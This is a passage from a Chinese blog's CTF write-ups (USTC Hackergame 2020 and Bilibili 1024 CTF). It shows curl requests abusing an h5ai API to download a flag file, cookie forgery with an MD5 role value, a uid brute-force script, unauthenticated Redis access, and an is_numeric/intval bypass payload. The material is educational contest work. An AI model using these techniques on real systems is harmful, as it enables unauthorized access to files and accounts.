<code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-06</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 